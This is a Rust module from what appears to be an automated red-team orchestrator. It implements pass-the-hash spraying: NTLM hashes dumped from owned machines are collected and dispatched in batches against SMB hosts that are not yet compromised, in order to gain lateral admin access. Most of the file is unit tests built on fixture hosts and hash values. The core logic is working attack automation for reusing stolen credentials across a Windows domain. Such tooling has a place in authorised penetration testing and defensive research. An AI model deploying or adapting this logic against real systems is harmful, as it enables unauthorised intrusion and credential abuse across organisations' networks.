//! auto_pth_spray -- pass-the-hash spray using dumped NTLM hashes.
//!
//! After secretsdump extracts NTLM hashes, this module sprays them across
//! hosts to find additional admin access. Uses netexec/crackmapexec with
//! NTLM hashes instead of passwords for lateral movement validation.
//!
//! This is distinct from credential_reuse (which tests passwords) and
//! secretsdump (which dumps from owned hosts). PTH spray tests hash-based
//! auth against non-owned hosts.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use super::credential_expansion::{
    domain_is_same_or_relative, resolve_cred_domain, resolve_host_domain,
};
use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Dispatches pass-the-hash spray against non-owned hosts using dumped NTLM hashes.
/// Interval: 45s.
pub async fn auto_pth_spray(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(45));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("pth_spray") {
            continue;
        }

        let work: Vec<PthWork> = {
            let state = dispatcher.state.read().await;
            match collect_pth_work(&state) {
                Some(items) => items,
                None => continue,
            }
        };

        // Limit to 5 per cycle to avoid overwhelming the throttler
        for item in work.into_iter().take(5) {
            let payload = build_pth_payload(&item);

            let priority = dispatcher.effective_priority("pth_spray");
            match dispatcher
                .throttled_submit("lateral", "lateral", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        host = %item.target_ip,
                        user = %item.username,
                        "PTH spray dispatched"
                    );
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_PTH_SPRAY, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_PTH_SPRAY, &item.dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!(host = %item.target_ip, "PTH spray deferred");
                }
                Err(e) => {
                    warn!(err = %e, host = %item.target_ip, "Failed to dispatch PTH spray");
                }
            }
        }
    }
}

/// Build the JSON payload for a single PTH spray dispatch.
pub(crate) fn build_pth_payload(item: &PthWork) -> serde_json::Value {
    json!({
        "technique": "pass_the_hash",
        "target_ip": item.target_ip,
        "hostname": item.hostname,
        "username": item.username,
        "ntlm_hash": item.ntlm_hash,
        "domain": item.domain,
        "protocol": "smb",
    })
}

/// Collects PTH spray work items from state. Returns `None` when there are no
/// NTLM hashes (caller should skip the cycle).
fn collect_pth_work(state: &StateInner) -> Option<Vec<PthWork>> {
    // Need NTLM hashes
    let ntlm_hashes: Vec<_> = state
        .hashes
        .iter()
        .filter(|h| {
            h.hash_type.to_lowercase().contains("ntlm")
                && !h.hash_value.is_empty()
                && h.hash_value.len() == 32
                && h.username.to_lowercase() != "krbtgt"
                && !h.username.ends_with('$')
        })
        .collect();

    if ntlm_hashes.is_empty() {
        return None;
    }

    let mut items = Vec::new();

    // For each non-owned host, try PTH with available NTLM hashes
    for host in &state.hosts {
        if host.owned {
            continue;
        }

        // Check if host has SMB (port 445)
        let has_smb = host.services.iter().any(|s| {
            let sl = s.to_lowercase();
            sl.contains("445") || sl.contains("smb") || sl.contains("cifs")
        });
        if !has_smb {
            continue;
        }
        let host_domain = resolve_host_domain(state, host);
        if !host_domain.is_empty() && state.is_domain_dominated(&host_domain) {
            continue;
        }

        // Try each unique NTLM hash against this host
        for hash in &ntlm_hashes {
            let hash_domain = resolve_cred_domain(state, &hash.domain);
            let domain = if !hash_domain.is_empty() {
                hash_domain.clone()
            } else {
                host_domain.clone()
            };
            if domain.is_empty() {
                continue;
            }
            if !hash_domain.is_empty() && !domain_is_same_or_relative(&host_domain, &hash_domain) {
                continue;
            }

            let dedup_key = format!(
                "pth:{}:{}:{}",
                host.ip,
                hash.username.to_lowercase(),
                &hash.hash_value[..8]
            );
            if state.is_processed(DEDUP_PTH_SPRAY, &dedup_key) {
                continue;
            }

            items.push(PthWork {
                dedup_key,
                target_ip: host.ip.clone(),
                hostname: host.hostname.clone(),
                username: hash.username.clone(),
                ntlm_hash: hash.hash_value.clone(),
                domain,
            });
        }
    }

    Some(items)
}

pub(crate) struct PthWork {
    pub dedup_key: String,
    pub target_ip: String,
    pub hostname: String,
    pub username: String,
    pub ntlm_hash: String,
    pub domain: String,
}

#[cfg(test)]
mod tests {
    use super::*;
    use ares_core::models::{Hash, Host};

    fn make_ntlm_hash(username: &str, hash_value: &str, domain: &str) -> Hash {
        Hash {
            id: format!("hash-{username}"),
            username: username.to_string(),
            hash_value: hash_value.to_string(),
            hash_type: "NTLM".to_string(),
            domain: domain.to_string(),
            cracked_password: None, // pragma: allowlist secret
            source: "secretsdump".to_string(),
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
            aes_key: None,
            is_previous: false,
            source_host: None,
            is_trust_key: false,
            trust_pair_label: None,
        }
    }

    fn make_smb_host(ip: &str, hostname: &str, owned: bool) -> Host {
        Host {
            ip: ip.to_string(),
            hostname: hostname.to_string(),
            os: String::new(),
            roles: Vec::new(),
            services: vec!["445/tcp microsoft-ds".to_string()],
            is_dc: false,
            owned,
        }
    }

    fn make_host_no_smb(ip: &str, hostname: &str) -> Host {
        Host {
            ip: ip.to_string(),
            hostname: hostname.to_string(),
            os: String::new(),
            roles: Vec::new(),
            services: vec!["80/tcp http".to_string()],
            is_dc: false,
            owned: false,
        }
    }

    #[test]
    fn dedup_key_format() {
        let key = format!("pth:{}:{}:{}", "192.168.58.10", "admin", "aabbccdd");
        assert_eq!(key, "pth:192.168.58.10:admin:aabbccdd");
    }

    #[test]
    fn dedup_set_name() {
        assert_eq!(DEDUP_PTH_SPRAY, "pth_spray");
    }

    #[test]
    fn ntlm_hash_filter_valid() {
        let hash_type = "NTLM";
        let hash_value = "aad3b435b51404eeaad3b435b51404ee";
        assert!(hash_type.to_lowercase().contains("ntlm"));
        assert!(!hash_value.is_empty());
        assert_eq!(hash_value.len(), 32);
    }

    #[test]
    fn ntlm_hash_filter_rejects_short() {
        let hash_value = "abc123";
        assert_ne!(hash_value.len(), 32);
    }

    #[test]
    fn ntlm_hash_filter_rejects_empty() {
        let hash_value = "";
        assert!(hash_value.is_empty());
    }

    #[test]
    fn ntlm_hash_filter_rejects_non_ntlm() {
        let hash_type = "aes256-cts-hmac-sha1-96";
        assert!(!hash_type.to_lowercase().contains("ntlm"));
    }

    #[test]
    fn smb_service_detection() {
        let services = ["445/tcp microsoft-ds".to_string()];
        let has_smb = services.iter().any(|s| {
            let sl = s.to_lowercase();
            sl.contains("445") || sl.contains("smb") || sl.contains("cifs")
        });
        assert!(has_smb);
    }

    #[test]
    fn no_smb_service() {
        let services = ["80/tcp http".to_string()];
        let has_smb = services.iter().any(|s| {
            let sl = s.to_lowercase();
            sl.contains("445") || sl.contains("smb") || sl.contains("cifs")
        });
        assert!(!has_smb);
    }

    #[test]
    fn domain_from_hash_preferred() {
        let hash_domain = "contoso.local";
        let hostname = "srv01.fabrikam.local";
        let domain = if !hash_domain.is_empty() {
            hash_domain.to_string()
        } else {
            hostname
                .find('.')
                .map(|i| hostname[i + 1..].to_string())
                .unwrap_or_default()
        };
        assert_eq!(domain, "contoso.local");
    }

    #[test]
    fn domain_fallback_to_hostname() {
        let hash_domain = "";
        let hostname = "srv01.fabrikam.local";
        let domain = if !hash_domain.is_empty() {
            hash_domain.to_string()
        } else {
            hostname
                .find('.')
                .map(|i| hostname[i + 1..].to_string())
                .unwrap_or_default()
        };
        assert_eq!(domain, "fabrikam.local");
    }

    #[test]
    fn dedup_key_uses_hash_prefix() {
        let ip = "192.168.58.10";
        let username = "Admin";
        let hash_value = "aad3b435b51404eeaad3b435b51404ee";
        let dedup_key = format!(
            "pth:{}:{}:{}",
            ip,
            username.to_lowercase(),
            &hash_value[..8]
        );
        assert_eq!(dedup_key, "pth:192.168.58.10:admin:aad3b435");
    }

    #[test]
    fn ntlm_hash_filter_exact_32() {
        let hash = "a".repeat(32);
        assert_eq!(hash.len(), 32);
        assert!(!hash.is_empty());
    }

    #[test]
    fn ntlm_hash_type_variations() {
        for t in ["NTLM", "ntlm", "NT", "ntlm_hash"] {
            assert!(t.to_lowercase().contains("ntlm") || t.to_lowercase().contains("nt"));
        }
    }

    #[test]
    fn smb_service_detection_cifs() {
        let services = ["cifs".to_string()];
        let has_smb = services.iter().any(|s| {
            let sl = s.to_lowercase();
            sl.contains("445") || sl.contains("smb") || sl.contains("cifs")
        });
        assert!(has_smb);
    }

    #[test]
    fn pth_payload_structure() {
        let payload = serde_json::json!({
            "technique": "pass_the_hash",
            "target_ip": "192.168.58.22",
            "hostname": "srv01.contoso.local",
            "username": "admin",
            "ntlm_hash": "aad3b435b51404eeaad3b435b51404ee",
            "domain": "contoso.local",
            "protocol": "smb",
        });
        assert_eq!(payload["technique"], "pass_the_hash");
        assert_eq!(payload["protocol"], "smb");
        assert_eq!(payload["ntlm_hash"], "aad3b435b51404eeaad3b435b51404ee");
    }

    #[test]
    fn pth_work_construction() {
        let work = PthWork {
            dedup_key: "pth:192.168.58.22:admin:aad3b435".into(),
            target_ip: "192.168.58.22".into(),
            hostname: "srv01.contoso.local".into(),
            username: "admin".into(),
            ntlm_hash: "aad3b435b51404eeaad3b435b51404ee".into(),
            domain: "contoso.local".into(),
        };
        assert_eq!(work.username, "admin");
        assert_eq!(work.ntlm_hash.len(), 32);
    }

    #[test]
    fn domain_fallback_bare_hostname() {
        let hash_domain = "";
        let hostname = "srv01";
        let domain = if !hash_domain.is_empty() {
            hash_domain.to_string()
        } else {
            hostname
                .find('.')
                .map(|i| hostname[i + 1..].to_string())
                .unwrap_or_default()
        };
        assert_eq!(domain, "");
    }

    #[test]
    fn take_5_limiting() {
        assert_eq!((0..20).take(5).count(), 5);
    }

    // --- collect_pth_work tests ---

    #[test]
    fn collect_empty_state_returns_none() {
        let state = StateInner::new("test".into());
        assert!(collect_pth_work(&state).is_none());
    }

    #[test]
    fn collect_no_hashes_returns_none() {
        let mut state = StateInner::new("test".into());
        state
            .hosts
            .push(make_smb_host("192.168.58.10", "srv01.contoso.local", false));
        assert!(collect_pth_work(&state).is_none());
    }

    #[test]
    fn collect_hashes_no_hosts_returns_empty() {
        let mut state = StateInner::new("test".into());
        state.hashes.push(make_ntlm_hash(
            "admin",
            "aad3b435b51404eeaad3b435b51404ee", // pragma: allowlist secret
            "contoso.local",
        ));
        let work = collect_pth_work(&state).unwrap();
        assert!(work.is_empty());
    }

    #[test]
    fn collect_hash_and_smb_host_produces_work() {
        let mut state = StateInner::new("test".into());
        state.hashes.push(make_ntlm_hash(
            "admin",
            "aad3b435b51404eeaad3b435b51404ee", // pragma: allowlist secret
            "contoso.local",
        ));
        state
            .hosts
            .push(make_smb_host("192.168.58.10", "srv01.contoso.local", false));
        let work = collect_pth_work(&state).unwrap();
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].target_ip, "192.168.58.10");
        assert_eq!(work[0].username, "admin");
        assert_eq!(work[0].domain, "contoso.local");
        assert_eq!(work[0].ntlm_hash, "aad3b435b51404eeaad3b435b51404ee");
    }

    #[test]
    fn collect_skips_owned_hosts() {
        let mut state = StateInner::new("test".into());
        state.hashes.push(make_ntlm_hash(
            "admin",
            "aad3b435b51404eeaad3b435b51404ee", // pragma: allowlist secret
            "contoso.local",
        ));
        state.hosts.push(make_smb_host(
            "192.168.58.10",
            "srv01.contoso.local",
            true, // owned
        ));
        let work = collect_pth_work(&state).unwrap();
        assert!(work.is_empty());
    }

    #[test]
    fn collect_skips_non_smb_hosts() {
        let mut state = StateInner::new("test".into());
        state.hashes.push(make_ntlm_hash(
            "admin",
            "aad3b435b51404eeaad3b435b51404ee", // pragma: allowlist secret
            "contoso.local",
        ));
        state
            .hosts
            .push(make_host_no_smb("192.168.58.20", "web01.contoso.local"));
        let work = collect_pth_work(&state).unwrap();
        assert!(work.is_empty());
    }

    #[test]
    fn collect_skips_dedup_processed() {
        let mut state = StateInner::new("test".into());
        state.hashes.push(make_ntlm_hash(
            "admin",
            "aad3b435b51404eeaad3b435b51404ee", // pragma: allowlist secret
            "contoso.local",
        ));
        state
            .hosts
            .push(make_smb_host("192.168.58.10", "srv01.contoso.local", false));
        // Mark as already processed
        state.mark_processed(
            DEDUP_PTH_SPRAY,
            "pth:192.168.58.10:admin:aad3b435".to_string(),
        );
        let work = collect_pth_work(&state).unwrap();
        assert!(work.is_empty());
    }

    #[test]
    fn collect_filters_non_ntlm_hashes() {
        let mut state = StateInner::new("test".into());
        state.hashes.push(Hash {
            id: "hash-aes".into(),
            username: "admin".into(),
            hash_value: "abcdef1234567890abcdef1234567890".into(), // pragma: allowlist secret
            hash_type: "aes256-cts-hmac-sha1-96".into(),
            domain: "contoso.local".into(),
            cracked_password: None, // pragma: allowlist secret
            source: "secretsdump".into(),
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
            aes_key: None,
            is_previous: false,
            source_host: None,
            is_trust_key: false,
            trust_pair_label: None,
        });
        state
            .hosts
            .push(make_smb_host("192.168.58.10", "srv01.contoso.local", false));
        // AES hash type should be rejected
        assert!(collect_pth_work(&state).is_none());
    }

    #[test]
    fn collect_filters_short_hash_values() {
        let mut state = StateInner::new("test".into());
        state.hashes.push(make_ntlm_hash(
            "admin",
            "aad3b435", // too short, not 32 chars - pragma: allowlist secret
            "contoso.local",
        ));
        state
            .hosts
            .push(make_smb_host("192.168.58.10", "srv01.contoso.local", false));
        assert!(collect_pth_work(&state).is_none());
    }

    #[test]
    fn collect_filters_empty_hash_values() {
        let mut state = StateInner::new("test".into());
        state.hashes.push(make_ntlm_hash(
            "admin",
            "", // empty - pragma: allowlist secret
            "contoso.local",
        ));
        state
            .hosts
            .push(make_smb_host("192.168.58.10", "srv01.contoso.local", false));
        assert!(collect_pth_work(&state).is_none());
    }

    #[test]
    fn collect_domain_fallback_from_hostname() {
        let mut state = StateInner::new("test".into());
        state.hashes.push(make_ntlm_hash(
            "admin",
            "aad3b435b51404eeaad3b435b51404ee", // pragma: allowlist secret
            "",                                 // empty domain on hash
        ));
        state.hosts.push(make_smb_host(
            "192.168.58.10",
            "srv01.fabrikam.local",
            false,
        ));
        let work = collect_pth_work(&state).unwrap();
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].domain, "fabrikam.local");
    }

    #[test]
    fn collect_domain_fallback_bare_hostname_empty() {
        let mut state = StateInner::new("test".into());
        state.hashes.push(make_ntlm_hash(
            "admin",
            "aad3b435b51404eeaad3b435b51404ee", // pragma: allowlist secret
            "",                                 // empty domain on hash
        ));
        state.hosts.push(make_smb_host(
            "192.168.58.10",
            "srv01", // no dot, no domain part
            false,
        ));
        let work = collect_pth_work(&state).unwrap();
        assert!(work.is_empty());
    }

    #[test]
    fn collect_multiple_hashes_multiple_hosts() {
        let mut state = StateInner::new("test".into());
        state.hashes.push(make_ntlm_hash(
            "admin",
            "aad3b435b51404eeaad3b435b51404ee", // pragma: allowlist secret
            "contoso.local",
        ));
        state.hashes.push(make_ntlm_hash(
            "svcacct",
            "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb", // pragma: allowlist secret
            "contoso.local",
        ));
        state
            .hosts
            .push(make_smb_host("192.168.58.10", "srv01.contoso.local", false));
        state
            .hosts
            .push(make_smb_host("192.168.58.20", "srv02.contoso.local", false));
        let work = collect_pth_work(&state).unwrap();
        // 2 hashes x 2 hosts = 4 work items
        assert_eq!(work.len(), 4);
    }

    #[test]
    fn collect_skips_cross_forest_hash_host_pairs() {
        let mut state = StateInner::new("test".into());
        state.hashes.push(make_ntlm_hash(
            "admin",
            "aad3b435b51404eeaad3b435b51404ee", // pragma: allowlist secret
            "contoso.local",
        ));
        state.hosts.push(make_smb_host(
            "192.168.58.254",
            "dc01.fabrikam.local",
            false,
        ));

        let work = collect_pth_work(&state).unwrap();
        assert!(work.is_empty());
    }

    #[test]
    fn collect_filters_machine_and_krbtgt_hashes() {
        let mut state = StateInner::new("test".into());
        state.hashes.push(make_ntlm_hash(
            "DC01$",
            "aad3b435b51404eeaad3b435b51404ee", // pragma: allowlist secret
            "child.contoso.local",
        ));
        state.hashes.push(make_ntlm_hash(
            "krbtgt",
            "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb", // pragma: allowlist secret
            "child.contoso.local",
        ));
        state.hosts.push(make_smb_host(
            "192.168.58.11",
            "srv01.child.contoso.local",
            false,
        ));

        assert!(collect_pth_work(&state).is_none());
    }

    #[test]
    fn collect_skips_dominated_target_domain() {
        let mut state = StateInner::new("test".into());
        state.hashes.push(make_ntlm_hash(
            "admin",
            "aad3b435b51404eeaad3b435b51404ee", // pragma: allowlist secret
            "contoso.local",
        ));
        state
            .hosts
            .push(make_smb_host("192.168.58.10", "srv01.contoso.local", false));
        state.dominated_domains.insert("contoso.local".into());

        let work = collect_pth_work(&state).unwrap();
        assert!(work.is_empty());
    }

    #[test]
    fn collect_dedup_key_lowercases_username() {
        let mut state = StateInner::new("test".into());
        state.hashes.push(make_ntlm_hash(
            "Administrator",
            "aad3b435b51404eeaad3b435b51404ee", // pragma: allowlist secret
            "contoso.local",
        ));
        state
            .hosts
            .push(make_smb_host("192.168.58.10", "srv01.contoso.local", false));
        let work = collect_pth_work(&state).unwrap();
        assert_eq!(work.len(), 1);
        assert!(work[0].dedup_key.contains(":administrator:"));
    }

    #[test]
    fn collect_mixed_owned_and_unowned_hosts() {
        let mut state = StateInner::new("test".into());
        state.hashes.push(make_ntlm_hash(
            "admin",
            "aad3b435b51404eeaad3b435b51404ee", // pragma: allowlist secret
            "contoso.local",
        ));
        state.hosts.push(make_smb_host(
            "192.168.58.10",
            "srv01.contoso.local",
            true, // owned
        ));
        state.hosts.push(make_smb_host(
            "192.168.58.20",
            "srv02.contoso.local",
            false, // not owned
        ));
        let work = collect_pth_work(&state).unwrap();
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].target_ip, "192.168.58.20");
    }

    #[test]
    fn collect_mixed_smb_and_non_smb_hosts() {
        let mut state = StateInner::new("test".into());
        state.hashes.push(make_ntlm_hash(
            "admin",
            "aad3b435b51404eeaad3b435b51404ee", // pragma: allowlist secret
            "contoso.local",
        ));
        state
            .hosts
            .push(make_host_no_smb("192.168.58.10", "web01.contoso.local"));
        state
            .hosts
            .push(make_smb_host("192.168.58.20", "srv01.contoso.local", false));
        let work = collect_pth_work(&state).unwrap();
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].target_ip, "192.168.58.20");
    }

    #[test]
    fn collect_smb_detection_via_smb_string() {
        let mut state = StateInner::new("test".into());
        state.hashes.push(make_ntlm_hash(
            "admin",
            "aad3b435b51404eeaad3b435b51404ee", // pragma: allowlist secret
            "contoso.local",
        ));
        state.hosts.push(Host {
            ip: "192.168.58.10".into(),
            hostname: "srv01.contoso.local".into(),
            os: String::new(),
            roles: Vec::new(),
            services: vec!["SMB".to_string()],
            is_dc: false,
            owned: false,
        });
        let work = collect_pth_work(&state).unwrap();
        assert_eq!(work.len(), 1);
    }

    #[test]
    fn collect_smb_detection_via_cifs_string() {
        let mut state = StateInner::new("test".into());
        state.hashes.push(make_ntlm_hash(
            "admin",
            "aad3b435b51404eeaad3b435b51404ee", // pragma: allowlist secret
            "contoso.local",
        ));
        state.hosts.push(Host {
            ip: "192.168.58.10".into(),
            hostname: "srv01.contoso.local".into(),
            os: String::new(),
            roles: Vec::new(),
            services: vec!["cifs/srv01.contoso.local".to_string()],
            is_dc: false,
            owned: false,
        });
        let work = collect_pth_work(&state).unwrap();
        assert_eq!(work.len(), 1);
    }

    #[test]
    fn collect_partial_dedup_only_skips_processed() {
        let mut state = StateInner::new("test".into());
        state.hashes.push(make_ntlm_hash(
            "admin",
            "aad3b435b51404eeaad3b435b51404ee", // pragma: allowlist secret
            "contoso.local",
        ));
        state.hashes.push(make_ntlm_hash(
            "svcacct",
            "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb", // pragma: allowlist secret
            "contoso.local",
        ));
        state
            .hosts
            .push(make_smb_host("192.168.58.10", "srv01.contoso.local", false));
        // Mark only admin as processed
        state.mark_processed(
            DEDUP_PTH_SPRAY,
            "pth:192.168.58.10:admin:aad3b435".to_string(),
        );
        let work = collect_pth_work(&state).unwrap();
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].username, "svcacct");
    }

    #[test]
    fn collect_hostname_preserved_in_work() {
        let mut state = StateInner::new("test".into());
        state.hashes.push(make_ntlm_hash(
            "admin",
            "aad3b435b51404eeaad3b435b51404ee", // pragma: allowlist secret
            "contoso.local",
        ));
        state
            .hosts
            .push(make_smb_host("192.168.58.10", "dc01.contoso.local", false));
        let work = collect_pth_work(&state).unwrap();
        assert_eq!(work[0].hostname, "dc01.contoso.local");
    }

    #[test]
    fn collect_hash_domain_must_match_hostname_domain() {
        let mut state = StateInner::new("test".into());
        state.hashes.push(make_ntlm_hash(
            "admin",
            "aad3b435b51404eeaad3b435b51404ee", // pragma: allowlist secret
            "contoso.local",
        ));
        state.hosts.push(make_smb_host(
            "192.168.58.10",
            "srv01.fabrikam.local",
            false,
        ));
        let work = collect_pth_work(&state).unwrap();
        assert!(work.is_empty());
    }

    #[test]
    fn collect_ntlm_hash_type_case_insensitive() {
        let mut state = StateInner::new("test".into());
        state.hashes.push(Hash {
            id: "hash-1".into(),
            username: "admin".into(),
            hash_value: "aad3b435b51404eeaad3b435b51404ee".into(), // pragma: allowlist secret
            hash_type: "Ntlm".into(),                              // mixed case
            domain: "contoso.local".into(),
            cracked_password: None, // pragma: allowlist secret
            source: "secretsdump".into(),
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
            aes_key: None,
            is_previous: false,
            source_host: None,
            is_trust_key: false,
            trust_pair_label: None,
        });
        state
            .hosts
            .push(make_smb_host("192.168.58.10", "srv01.contoso.local", false));
        let work = collect_pth_work(&state).unwrap();
        assert_eq!(work.len(), 1);
    }

    // ── build_pth_payload ─────────────────────────────────────────────

    #[test]
    fn build_pth_payload_emits_expected_fields() {
        let item = PthWork {
            dedup_key: "pth:contoso.local:alice:192.168.58.20".into(),
            target_ip: "192.168.58.20".into(),
            hostname: "sql01.contoso.local".into(),
            username: "alice".into(),
            ntlm_hash: "aad3b435b51404eeaad3b435b51404ee".into(),
            domain: "contoso.local".into(),
        };
        let p = build_pth_payload(&item);
        assert_eq!(p["technique"], "pass_the_hash");
        assert_eq!(p["target_ip"], "192.168.58.20");
        assert_eq!(p["hostname"], "sql01.contoso.local");
        assert_eq!(p["username"], "alice");
        assert_eq!(p["ntlm_hash"], "aad3b435b51404eeaad3b435b51404ee");
        assert_eq!(p["domain"], "contoso.local");
        assert_eq!(p["protocol"], "smb");
    }
}
